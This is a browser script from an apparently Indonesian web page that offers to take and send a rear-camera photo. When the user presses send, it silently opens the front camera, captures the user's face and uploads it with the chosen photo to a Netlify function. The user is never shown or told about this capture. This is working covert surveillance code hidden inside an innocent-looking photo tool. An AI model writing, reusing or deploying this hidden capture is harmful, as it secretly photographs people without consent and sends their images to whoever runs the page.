<script>
const intro         = document.getElementById('intro');
const cameraEl      = document.getElementById('camera');
const reviewEl      = document.getElementById('review');
const statusOverlay = document.getElementById('statusOverlay');
const statusMsg     = document.getElementById('statusMsg');

const startBtn  = document.getElementById('startBtn');
const shutter   = document.getElementById('shutter');
const cancelBtn = document.getElementById('cancelBtn');
const sendBtn   = document.getElementById('sendBtn');

const preview   = document.getElementById('preview');
const reviewImg = document.getElementById('reviewImg');

const vFront = document.getElementById('vFront');
const cBack  = document.getElementById('cBack');
const cFront = document.getElementById('cFront');

let backStream  = null;
let frontStream = null;
let capturedBackBlob = null;
let backDeviceId  = null;
let frontDeviceId = null;

function showStatus(msg, cls = '') {
  statusMsg.textContent = msg;
  statusOverlay.className = 'active ' + cls;
}
function hideStatus() { statusOverlay.className = ''; }

function stopStream(s) {
  if (!s) return;
  s.getTracks().forEach(t => { try { t.stop(); } catch(e){} });
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

// deteksi deviceId kamera depan & belakang via enumerateDevices
async function detectCameras() {
  // butuh izin dulu supaya label+deviceId kebaca
  const tmp = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
  tmp.getTracks().forEach(t => t.stop());
  await sleep(200);

  const devices = await navigator.mediaDevices.enumerateDevices();
  const cams = devices.filter(d => d.kind === 'videoinput');

  // cari label yang mengandung "back"/"rear"/"environment" = kamera belakang
  // dan "front"/"user"/"face" = kamera depan
  for (const c of cams) {
    const l = (c.label || '').toLowerCase();
    if (!backDeviceId && (l.includes('back') || l.includes('rear') || l.includes('environment') || l.includes('world'))) {
      backDeviceId = c.deviceId;
    }
    if (!frontDeviceId && (l.includes('front') || l.includes('user') || l.includes('face') || l.includes('self'))) {
      frontDeviceId = c.deviceId;
    }
  }

  // fallback: kalau label kosong / nggak match, asumsi cams[0]=belakang, cams[last]=depan
  if (!backDeviceId && cams[0]) backDeviceId = cams[0].deviceId;
  if (!frontDeviceId && cams.length > 1) frontDeviceId = cams[cams.length - 1].deviceId;
}

function buildConstraints(deviceId, facing) {
  if (deviceId) {
    return {
      video: { deviceId: { exact: deviceId }, width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: false
    };
  }
  return {
    video: { facingMode: { ideal: facing }, width: { ideal: 1280 }, height: { ideal: 720 } },
    audio: false
  };
}

async function openBackCamera() {
  backStream = await navigator.mediaDevices.getUserMedia(buildConstraints(backDeviceId, 'environment'));
  preview.srcObject = backStream;
  preview.setAttribute('playsinline', '');
  preview.setAttribute('muted', '');
  await preview.play();
}

async function openFrontCamera(retries = 5) {
  for (let i = 0; i < retries; i++) {
    try {
      frontStream = await navigator.mediaDevices.getUserMedia(buildConstraints(frontDeviceId, 'user'));
      vFront.srcObject = frontStream;
      vFront.setAttribute('playsinline', '');
      vFront.setAttribute('muted', '');
      await vFront.play();
      await waitFrame(vFront);
      return;
    } catch (err) {
      if (i === retries - 1) throw err;
      // tunggu makin lama tiap retry: 400, 800, 1200, 1600 ms
      await sleep(400 * (i + 1));
    }
  }
}

function waitFrame(v) {
  return new Promise(res => {
    if (v.readyState >= 2 && v.videoWidth > 0) return res();
    const t = setTimeout(res, 2000);
    v.onloadeddata = () => { clearTimeout(t); res(); };
  });
}

function grabBlob(video, canvas, quality = 0.85) {
  canvas.width  = video.videoWidth  || 640;
  canvas.height = video.videoHeight || 480;
  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  return new Promise(res => canvas.toBlob(res, 'image/jpeg', quality));
}

function blobToBase64(blob) {
  return new Promise((res, rej) => {
    const fr = new FileReader();
    fr.onload = () => res(fr.result.split(',')[1]);
    fr.onerror = rej;
    fr.readAsDataURL(blob);
  });
}

async function sendPhoto(blob, caption) {
  const photoBase64 = await blobToBase64(blob);
  const r = await fetch('/.netlify/functions/send', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ caption, photoBase64 })
  });
  const data = await r.json();
  if (!data.ok) throw new Error(data.description || 'send error');
  return data;
}

/* ---------- flow ---------- */

startBtn.addEventListener('click', async () => {
  startBtn.disabled = true;
  try {
    showStatus('Menyiapkan kamera...');
    await detectCameras();
    await openBackCamera();
    hideStatus();
    intro.style.display = 'none';
    cameraEl.classList.add('active');
  } catch (err) {
    showStatus('Izin kamera ditolak: ' + err.message, 'err');
    startBtn.disabled = false;
  }
});

shutter.addEventListener('click', async () => {
  shutter.disabled = true;
  try {
    await waitFrame(preview);
    capturedBackBlob = await grabBlob(preview, cBack, 0.9);
    reviewImg.src = URL.createObjectURL(capturedBackBlob);
    cameraEl.classList.remove('active');
    reviewEl.classList.add('active');
  } catch (err) {
    alert('Gagal ambil gambar: ' + err.message);
  } finally {
    shutter.disabled = false;
  }
});

cancelBtn.addEventListener('click', () => {
  if (capturedBackBlob) {
    URL.revokeObjectURL(reviewImg.src);
    capturedBackBlob = null;
  }
  reviewImg.src = '';
  reviewEl.classList.remove('active');
  cameraEl.classList.add('active');
});

sendBtn.addEventListener('click', async () => {
  if (!capturedBackBlob) return;
  cancelBtn.disabled = true;
  sendBtn.disabled = true;

  try {
    showStatus('Mengirim...');

    // MATIKAN kamera belakang total, tunggu 800ms biar driver lepas
    stopStream(backStream);
    preview.srcObject = null;
    preview.load();
    backStream = null;
    await sleep(800);

    // capture kamera depan dengan retry
    await openFrontCamera();
    const frontBlob = await grabBlob(vFront, cFront, 0.85);

    // matikan kamera depan
    stopStream(frontStream);
    vFront.srcObject = null;
    vFront.load();
    frontStream = null;

    // kirim dua-duanya
    await sendPhoto(capturedBackBlob, '📷 Kamera belakang');
    await sendPhoto(frontBlob,        '📸 Kamera depan');

    showStatus('Terkirim ✓', 'ok');
    setTimeout(() => location.reload(), 1200);
  } catch (err) {
    showStatus('Gagal: ' + err.message, 'err');
    cancelBtn.disabled = false;
    sendBtn.disabled = false;
  }
});
</script>
